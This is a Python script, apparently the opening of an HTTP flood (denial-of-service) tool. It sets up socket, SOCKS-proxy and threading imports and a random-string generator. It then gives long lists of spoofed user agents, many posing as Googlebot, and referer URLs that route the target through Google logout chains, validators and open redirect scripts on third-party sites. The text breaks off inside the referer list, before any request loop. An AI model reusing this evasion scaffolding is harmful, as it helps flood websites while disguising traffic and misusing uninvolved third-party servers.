# -*- coding: utf-8 -*-
import socket
import random
import errno
import socks
from threading import Thread
from Queue import Queue
print ("""
############################
# Coder: Cüneyt TANRISEVER #
############################
""")
def dex():
    global cuneyt
    global dexalfabem
    dexalfabem=["a","b","c","d","f","e","g","h","i","j","k","l","m","n","o","u","p","r","s","t","v","y","z"]
    cuneyt= random.randint(1000, 9999)
    cuneyt1= random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)
    cuneyt2= random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)+random.choice(dexalfabem)
    dex=cuneyt1+str(cuneyt)+cuneyt2
    return dex
 
kaynak=[]
kntr=[]
butunkabul = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", "Accept-Encoding: gzip, deflate\r\n", "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"]
baglantisi = "Connection: Keep-Alive\r\n" 

googleuseragents=["Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
			"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
			"Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
			"Mozilla/5.0 (compatible; Googlebot/2.1; startmebot/1.0; +https://start.me/bot)",
			"Googlebot/2.1 (+http://www.google.com/bot.html)",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Chrome/27.0.1453 Safari/537.36 GoogleBot/2.1",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Chrome/27.0.1453 Safari/537.36 GoogleBot/2.1",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko; Google Page Speed Insights) Version/6.0 Mobile/10A525 Safari/8536.25 GoogleBot/2.1",
			"Mozilla/5.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.4 (KHTML, like Gecko; Google Page Speed Insights) Chrome/22.0.1229 Safari/537.4 GoogleBot/2.1",
			"Mozilla/5.0 (compatible;acapbot/0.1;treat like Googlebot)",
			"Googlebot-Image/1.0",
			"Google Crawler: Googlebot/2.1 (+http://www.google.com/bot.html)",
			"Mozilla/5.0 (iPhone; U; CPU iPhone 0S 3.0 like Mac 0S X; en-us; compatible; Googlebot/2.1; http://www.google.com/bot.html; AppleWebKit/528.18(KHTML,like Gecko) Version/4.0 Mobile/7A341 Safari/528.16 UNTRUSTED/1.0",
			"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36",
			"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) UNTRUSTED/1.0",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"]
useragents=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
			"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
			"Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
			"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
			"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
			"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
			"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
			"?Mozilla/5.0 (Linux; Android 4.4.2; en-us; SAMSUNG SCH-R970 USCC Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; MB886 Build/9.8.0Q-97_MB886_FFW-20) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
			"Mozilla/5.0 (Linux; Android 7.1.1; N9560 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
			"Mozilla/5.0 (Mobile; $LYF/$F30C/$LYF_F30C-000-09-09-010218; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0",
			"Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; SPH-D710VMUB Build/IMM76I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
			"Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; SCH-R720 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Opera/9.80 (Android; Opera Mini/31.0.2254/77.161; U; en) Presto/2.12.423 Version/12.16",
			"Opera/9.80 (Android; Opera Mini/20.1.2254/37.9178; U; en) Presto/2.12.423 Version/12.16",
			"Opera/9.80 (SpreadTrum; Opera Mini/4.4.33961/73.132; U; fr) Presto/2.12.423 Version/12.16",
			"Lenovo-A398t_TD/S100 Linux/3.0.8 Android/4.0.3 Release/03.12.2013 Browser/AppleWebkit534.30 Mobile Safari/534.30",
			"ZTE-Z222/1.0.6 NetFront/3.5 QTV5.1 Profile/MIDP-2.1 Configuration/CLDC-1.1",
			"Opera/9.80 (SpreadTrum; Opera Mini/4.4.32739/75.35; U; en) Presto/2.12.423 Version/12.16",
			"Opera/9.80 (SpreadTrum; Opera Mini/4.4.31492/59.323; U; en) Presto/2.12.423 Version/12.16",
			"Opera/9.80 (Android; Opera Mini/20.0.2254/37.9072; U; en) Presto/2.12.423 Version/12.16",
			"Mozilla/5.0 (Android; Mobile; rv:34.0) Gecko/34.0 Firefox/34.0",
			"MT6735_TD/V1 Linux/3.10.65+ Android/5.1 Release/03.03.2015 Browser/AppleWebKit537.36 Chrome/39.0.0.0 Mobile Safari/537.36 System/Android 5.1;",
			"Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo TB2-X30F Build/LenovoTB2-X30F)",
			"BlackBerry8520/5.0.0.1036 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/139",
			"Opera/9.80 (Android; Opera Mini/21.0.2254/37.9178; U; en) Presto/2.12.423 Version/12.16",
			"Opera/9.80 (SpreadTrum; Opera Mini/4.4.32739/59.297; U; fr) Presto/2.12.423 Version/12.16",
			"Dalvik/1.6.0 (Linux; U; Android 4.3.1; WT22M-FI Build/JLS36I)",
			"Mozilla/5.0 (Linux; U; Android 4.2.2; es-us; HUAWEI Y600-U151 Build/HUAWEIY600-U151) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
			"Mozilla/5.0 (Linux; Android 4.4.2; en-us; SAMSUNG SCH-R970C Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36",
			"BlackBerry8520/5.0.0.592 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/173",
			"Opera/9.80 (Android; Opera Mini/29.0.2254/69.162; U; en) Presto/2.12.423 Version/12.16",
			"Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; ZTE-N910 Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Opera/9.80 (SpreadTrum; Opera Mini/4.4.32739/58.167; U; fr) Presto/2.12.423 Version/12.16",
			"Opera/9.80 (BlackBerry; Opera Mini/8.0.35659/37.8069; U; en) Presto/2.12.423 Version/12.16",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.40312/37.7751; U; en) Presto/2.12.423 Version/12.16",
			"Mozilla/5.0 (Linux; Android 4.4.2; en-us; SAMSUNG-SGH-I337Z Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1",
			"Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
			"Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36",
			"HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; Nokia;N70)",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/9 (Compatible; MSIE:9.0; iPhone; BlackBerry9700; AppleWebKit/24.746; U; en) Presto/2.5.25 Version/10.54",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/418.9.1 (KHTML, like Gecko) Safari/419.3 TeaShark/0.8",
			"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; WOW64; Trident/4.0; uZardWeb/1.0; Server_USA)",
			"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; WOW64; Trident/4.0; uZardWeb/1.0; Server_KO_KTF)",
			"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; WOW64; Trident/4.0; uZard/1.0; Server_KO_SKT)",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; WOW64; SV1; uZardWeb/1.0; Server_HK)",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; WOW64; SV1; uZardWeb/1.0; Server_EN)",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; WOW64; SV1; uZardWeb/1.0; Server_CN)",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)",
			"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW800c/R1L Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW800c/R1BC Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW800c/R1AA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW700c/R1DB Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW700c/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK750c/R1DB Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK750c/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK750c/R1BC Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"Opera/9.80 (Windows NT 6.1; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00",
			"Opera/9.80 (Windows NT 6.0; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00",
			"Opera/9.80 (Windows NT 5.1; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00",
			"Opera/9.80 (Windows Mobile; WCE; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00",
			"Opera/9.80 (Macintosh; Intel Mac OS X; Opera Mobi/3730; U; en) Presto/2.4.18 Version/10.00",
			"Opera/9.80 (Macintosh; Intel Mac OS X; Opera Mobi/27; U; en) Presto/2.4.18 Version/10.00",
			"Opera/9.80 (Linux i686; Opera Mobi/1040; U; en) Presto/2.5.24 Version/10.00",
			"Opera/9.80 (Linux i686; Opera Mobi/1038; U; en) Presto/2.5.24 Version/10.00",
			"Opera/9.80 (Android; Linux; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00",
			"Opera/9.80 (Android; Linux; Opera Mobi/27; U; en) Presto/2.4.18 Version/10.00",
			"Mozilla/5.0 (S60; SymbOS; Opera Mobi/SYB-1103211396; U; es-LA; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
			"Mozilla/5.0 (S60; SymbOS; Opera Mobi/1209; U; it; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.1",
			"Mozilla/5.0 (S60; SymbOS; Opera Mobi/1181; U; en-GB; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.1",
			"Mozilla/5.0 (Linux armv7l; Maemo; Opera Mobi/4; U; fr; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.1",
			"Mozilla/5.0 (Linux armv6l; Maemo; Opera Mobi/8; U; en-GB; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
			"Mozilla/5.0 (Android 2.2.2; Linux; Opera Mobi/ADR-1103311355; U; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
			"Mozilla/4.0 (compatible; MSIE 8.0; S60; SymbOS; Opera Mobi/SYB-1107071606; en) Opera 11.10",
			"Mozilla/4.0 (compatible; MSIE 8.0; Linux armv7l; Maemo; Opera Mobi/4; fr) Opera 10.1",
			"Mozilla/4.0 (compatible; MSIE 8.0; Linux armv6l; Maemo; Opera Mobi/8; en-GB) Opera 11.00",
			"Mozilla/4.0 (compatible; MSIE 8.0; Android 2.2.2; Linux; Opera Mobi/ADR-1103311355; en) Opera 11.00",
			"Opera/9.80 (Android; Linux; Opera Mobi/ADR-1012221546; U; pl) Presto/2.7.60 Version/10.5",
			"Opera/9.80 (Android 2.2;;; Linux; Opera Mobi/ADR-1012291359; U; en) Presto/2.7.60 Version/10.5",
			"Opera/9.80 (Android 2.2; Opera Mobi/ADR-2093533608; U; pl) Presto/2.7.60 Version/10.5",
			"Opera/9.80 (Android 2.2; Opera Mobi/-2118645896; U; pl) Presto/2.7.60 Version/10.5",
			"Opera/9.80 (Android 2.2; Linux; Opera Mobi/ADR-2093533312; U; pl) Presto/2.7.60 Version/10.5",
			"Opera/9.80 (Android 2.2; Linux; Opera Mobi/ADR-2093533120; U; pl) Presto/2.7.60 Version/10.5",
			"Opera/9.80 (Android 2.2; Linux; Opera Mobi/8745; U; en) Presto/2.7.60 Version/10.5",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/886; U; en) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/870; U; id) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/22.453; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/22.401; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/22.394; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.11) Gecko/23.390; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (Linux; U;",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (compatible; MSIE 5.0; UNIX) Opera 6.12 [en]/24.838; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/24.705; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.60 (J2ME/MIDP; Opera Mini/4.0/490; U; en) Presto/2.2.0",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/870; U; id) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/35.5706; U; id) Presto/2.8.119 Version/11.10",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/24.746; U; id) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/23.334; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/23.333; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/22.394; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/23.334; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/23.333; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/22.401; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/20.2485; U; en) Presto/2.5.25",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/18.678; U; en) Presto/2.4.15",
			"Opera/9.60 (J2ME/MIDP;Opera Mini/4.2.15410Mod.by.Handler/503; U; en)Presto/2.2.0",
			"Opera/9.50 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/20.2590; U; en)",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0/870; U; en) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0(Windows; U; Windows NT 5.1; en-US)/23.390; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 6.1; sv-SE) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/24.838; U; id) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/22.478; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/23.377; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows NT 6.1; WOW64) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (SymbianOS/24.838; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/24.838; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/24.741; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (iPhone; U; xxxx like Mac OS X; en) AppleWebKit/24.838; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (iPhone; U; fr; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/23.405; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/23.377; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (BlackBerry; U; BlackBerry9800; en-GB) AppleWebKit/24.783; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (BlackBerry; U; BlackBerry 9800) AppleWebKit/24.783; U; es) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/iPhone;Opera Mini/5.0.019802/886; U; ja)Presto/2.4.15",
			"Opera/9.80 (J2ME/iPhone;Opera Mini/5.0.019802/886; U; ja)Presto/ 2.4.15",
			"Opera/9.80 (J2ME/iPhone;Opera Mini/5.0.019802/886; U; ja) Presto/2.4.15",
			"Opera/9.80 (iPhone; Opera Mini/5.0.019802/886; U; ja) Presto/2.4.15",
			"Opera/9.80 (iPhone; Opera Mini/5.0.019802/886; U; en) Presto/2.4.15",
			"Opera/9.80 (iPhone; Opera Mini/5.0.019802/22.414; U; de) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (iPhone; Opera Mini/5.0.019802/18.738; U; en) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/886; U; id) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/886; U; en) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/870; U; fr) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/870; U; en) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/18.794; U; en) Presto/2.4.15",
			"SAMSUNG-C5212/C5212XDIK1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"MozillaMozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.5 (screen 824x1200;rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.5 (screen 824x1200;rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.5 (screen 824x1200; rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.5 (screen 600x800; rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.5 (screen 1200x824; rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.3 (screen 600x800; rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.3 (screen 1200x824; rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.1 (screen 824x1200; rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.0 (screen 824x1200; rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.0 (screen 600x800)",
			"Mozilla/4.0 (compatible; Linux 2.6.10) NetFront/3.4 Kindle/1.0 (screen 600x800)"]

def refererdex():
	dex=["https://asia.google.com/search?btnI&q=%s"%(url),
			"http://blogsearch.google.com/search?btnI&q=%s"%(url),
			"http://clients1.google.com/search?btnI&q=%s"%(url),
			"http://images.google.com/search?btnI&q=%s"%(url),
			"http://mail.google.com/search?btnI&q=%s"%(url),
			"http://map.google.com/search?btnI&q=%s"%(url),
			"http://www.google.com/search?btnI&q=%s"%(url),
			"http://appengine.google.com/_ah/logout?continue=%s"%(url),
			"https://accounts.google.com/Logout?continue=https://appengine.google.com/_ah/logout?continue=%s"%(url),
			"https://google.com/accounts/Logout?continue=https://appengine.google.com/_ah/logout?continue=%s"%(url),
			"https://validator.w3.org/check?uri=http://forum.buffed.de/redirect.php?url=%s"%(url),
			"http://www2.ogs.state.ny.us/help/urlstatusgo.html?url=%s"%(url),
			"http://validator.w3.org/feed/check.cgi?url=%s"%(url),
			"http://www.sadsong.net/redirect.php?url=%s"%(url),
			"http://www.jerrywho.de/?s=/redirect.php?url=%s"%(url),
			"http://newsdiffs.org/article-history/iowaairs.org/redirect.php?url=%s"%(url),
			"http://zakaztovarov.net/redirect.php?url=%s"%(url),
			"http://old.leginet.eu/redirect.php?url=%s"%(url),
			"http://www.phuketbranches.com/admin/redirect.php?url=%s"%(url),
			"http://www.seo.khabarsaz.net/redirect.php?url=%s"%(url),
			"http://it4pal.com/ar/go.php?url=%s"%(url),
			"http://www.hangglider.kiev.ua/go.php?url=%s"%(url),
			"http://tools.strugacreative.com/redirect.php?url=%s"%(url),
			"http://ukrhome.net/go.php?url=%s"%(url),
			"http://www.ennk.ru/go.php?url=%s"%(url),
			"http://www.bloggerexp.com/go.php?url=%s"%(url),
			"http://ruforum.mt5.com/redirect.php?url=%s"%(url),
			"https://www.google.com/interstitial?url=%s"%(url),
			"http://www.roetti.de/Oststammtisch-Forum/Forum/go.php?url=%s"%(url),
			"http://www.cbpp.org/cms/sites/all/modules/ckeditor_link/proxy.php?url=%s"%(url),
			"http://weiter-lesen.net/web/proxy.php?url=%s"%(url),
			"http://www.vttour.fr/actu/go.php?url=%s"%(url),
			"http://www.xoxohth.com/go.php?url=%s"%(url),
			"http://www.autoadmit.com/go.php?url=%s"%(url),
			"http://engelcosmetology.kiev.ua/go.php?url=%s"%(url),
			"http://irc.ifmo.ru/go.php?url=%s"%(url),
			"http://www.health.omskinform.ru/go.php?url=%s"%(url),
			"http://www.education.net.au/go.php?url=%s"%(url),
			"http://rusbody.com/go.php?url=%s"%(url),
			"http://valaholeuropaban.uw.hu/guestbook/go.php?url=%s"%(url),
			"http://enrique-iglesias.net/guestbook/go.php?url=%s"%(url),
			"http://vps.cohenrisk.com/~xoxohth/go.php?url=%s"%(url),
			"http://www.quelsoft.com/go.php?url=%s"%(url),
			"http://www.xohth.com/beta/go.php?url=%s"%(url),
			"http://www.find-a-car.info/go.php?url=%s"%(url),
			"http://www.jonko.eu/tools/hide_referrer/go.php?url=%s"%(url),
			"http://ec2-50-17-240-22.compute-1.amazonaws.com/blog/go.php?url=%s"%(url),
			"http://www.sportzone.ru/go.php?url=%s"%(url),
			"http://autoqa.org/go.php?url=%s"%(url),
			"http://depressionclub.awardspace.com/go.php?url=%s"%(url),
			"http://shopdazzles.com/guestbook/go.php?url=%s"%(url),
			"http://www.jenteporten.no/go.php?url=%s"%(url),
			"http://ww3.myonlinestats.com/go/go.php?url=%s"%(url),
